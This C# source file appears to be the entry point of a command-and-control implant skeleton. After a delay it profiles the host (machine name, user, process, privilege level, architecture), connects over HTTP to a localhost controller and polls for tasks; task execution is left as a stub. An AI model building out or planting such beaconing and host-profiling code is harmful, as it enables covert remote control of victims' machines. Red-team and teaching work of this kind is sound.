using Agent.Models;

using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;

namespace Agent
{
    internal class Program
    {
        private static AgentMetaData _metadata;
        private static CommModule _commModule;

        private static CancellationTokenSource _tokenSource;


        static void Main(string[] args)
        {
            Thread.Sleep(10000);

            GenerateMetadata();

            _commModule = new HttpCommModule("localhost", 8080);
            _commModule.Init(_metadata);
            _commModule.Start();

            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                if (_commModule.RecvData(out var tasks))
                {
                    // action tasks
                }
            }
        }
        public void Stop()
        {
            _tokenSource.Cancel();
        }

        static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);

            string integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }

            _metadata = new AgentMetaData()
            {
                Id = Guid.NewGuid().ToString(),
                HostName = Environment.MachineName, // Alter this to pull Hostname from DNS for more reliable return
                UserName = identity.Name,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };

            process.Dispose();
            identity.Dispose();
        }
    }
}
